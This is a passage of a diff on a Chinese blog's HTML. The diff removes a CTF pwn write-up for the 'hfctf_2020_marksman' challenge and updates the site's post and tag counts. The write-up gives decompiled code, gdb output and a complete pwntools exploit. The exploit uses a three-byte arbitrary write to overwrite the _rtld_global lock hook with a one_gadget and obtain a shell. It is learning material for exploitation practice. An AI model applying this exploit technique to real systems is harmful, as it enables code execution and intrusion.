class="string">&quot;shoot!shoot!&quot;</span>);</span><br><span class="line">  v6 = sub_B78();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;biang!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;v7[i], <span class="number">1uLL</span>);</span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_BC2(v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )                  <span class="comment">// 任意地址写三个字节</span></span><br><span class="line">      *(j + v6) = v7[j];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !dlopen(<span class="number">0LL</span>, <span class="number">1</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bye~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在<code>sub_B78()</code>函数中用<code>atol</code>函数返回了一个长整型，所以题目整体来说就是给了一个三个字节的任意地址写，而且程序一开始还给了libc</p>
-<p>但是程序也有一点限制，在<code>sub_BC2(v7)</code>中限制了一些任意写的字节</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_BC2</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (*a1 != <span class="number">0xC5</span> || a1[<span class="number">1</span>] != <span class="number">0xF2</span>) &amp;&amp; (*a1 != <span class="number">0x22</span> || a1[<span class="number">1</span>] != <span class="number">0xF3</span>) &amp;&amp; *a1 != <span class="number">0x8C</span> &amp;&amp; a1[<span class="number">1</span>] != <span class="number">0xA3</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You always want a Gold Finger!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>而这些字节其实就是部分one_gadget</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
-
-<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>首先找到<code>_rtld_global</code>结构体于libc基址的偏移，要注意<code>_rtld_global</code>是在ld中的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;_rtld_global</span><br><span class="line">$1 = (struct rtld_global *) 0x7fee9af22060 &lt;_rtld_global&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后找<code>__rtld_lock_unlock_recursive</code>于<code>_rtld_global</code>的偏移</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p _rtld_global</span><br><span class="line">...</span><br><span class="line">audit_data = &#123;&#123;</span><br><span class="line">      cookie = 0x0, </span><br><span class="line">      bindflags = 0x0</span><br><span class="line">    &#125; &lt;repeats 16 times&gt;&#125;, </span><br><span class="line">  _dl_rtld_lock_recursive = 0x7fee9acfb0e0 &lt;rtld_lock_default_lock_recursive&gt;, </span><br><span class="line">  _dl_rtld_unlock_recursive = 0x7fee9acfb0f0 &lt;rtld_lock_default_unlock_recursive&gt;, </span><br><span class="line">  _dl_make_stack_executable_hook = 0x7fee9ad0dd00 &lt;__GI__dl_make_stack_executable&gt;, </span><br><span class="line">  _dl_stack_flags = 0x6, </span><br><span class="line">  _dl_tls_dtv_gaps = 0x0, </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fee9af22f60 &lt;_rtld_global+3840&gt;:	0x00007fee9acfb0e0	0x00007fee9acfb0f0</span><br></pre></td></tr></table></figure>
-
-<p>一般来说偏移会在<code>3840</code>上下</p>
-<p>得到这两个偏移后就可以开始写入了，这时回到写入字节的限制，一般有两种方法：1.在one_gadget命令中加上<code>-l num</code>参数，这个参数会将一些不那么容易满足条件的one_gadget也显示出来，可以试一下这些。2.查看最初的几个one_gadget地址中往上的几条命令，看看有没有不影响程序最后执行的命令，如果有的话就可以以这个地址为one_gadget的起点从而绕过写入字节的限制。</p>
-<p>比如说这题，我们查看偏移为<code>0x10a38c</code>的one_gadget上面的几条命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x7fb239510379 &lt;exec_comm+2489&gt;:	cmp    eax,0xab39a</span><br><span class="line">0x7fb23951037e &lt;exec_comm+2494&gt;:	call   0x7fb239448cb0 &lt;__unsetenv&gt;</span><br><span class="line">0x7fb239510383 &lt;exec_comm+2499&gt;:	mov    edi,DWORD PTR [rsp+0x68]</span><br><span class="line">0x7fb239510387 &lt;exec_comm+2503&gt;:	call   0x7fb2395168c0 &lt;__GI___close&gt;</span><br><span class="line">0x7fb23951038c &lt;exec_comm+2508&gt;:	mov    rax,QWORD PTR [rip+0x2e0b15]        #one_gadget的起点</span><br><span class="line">0x7fb239510393 &lt;exec_comm+2515&gt;:	lea    rsi,[rsp+0x70]</span><br><span class="line">0x7fb239510398 &lt;exec_comm+2520&gt;:	lea    rdi,[rip+0xa9afb]</span><br><span class="line">0x7fb23951039f &lt;exec_comm+2527&gt;:	mov    rdx,QWORD PTR [rax]</span><br><span class="line">0x7fb2395103a2 &lt;exec_comm+2530&gt;:	call   0x7fb2394eae30 &lt;execve&gt;</span><br></pre></td></tr></table></figure>
-
-<p>发现<code>0x10a38c</code>上面的一条命令是<code>call close</code>，这条命令应该不会影响程序最后的执行，所以我们以<code>0x10a387</code>为one_gadget的起点，这样就饶过了写入字节的限制。</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./hfctf_2020_marksman&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/giantbranch/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - (<span class="number">0x7fe027d2e9c0</span> - <span class="number">0x00007fe027cae000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rtld_global = libc_base + <span class="number">8507488</span></span><br><span class="line">addr = rtld_global + <span class="number">3840</span></span><br><span class="line">og = libc_base + <span class="number">0x10a387</span></span><br><span class="line">a = og&amp;<span class="number">0xff</span></span><br><span class="line">b = (og&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">c = (og&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;shoot!shoot!&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;biang!&quot;</span>,p8(a))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;biang!&quot;</span>,p8(b))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;biang!&quot;</span>,p8(c))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>经过调试发现劫持<code>__rtld_lock_lock_recursive</code>或者<code>__rtld_lock_unlock_recursive</code>最后都能执行<code>one_gadget</code>，但是劫持<code>__rtld_lock_unlock_recursive</code>时就是拿不到shell，可能是执行这两个函数时栈环境不太一样导致的。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1416,14 +1462,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">64</span>
+          <span class="site-state-item-count">65</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-count">44</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
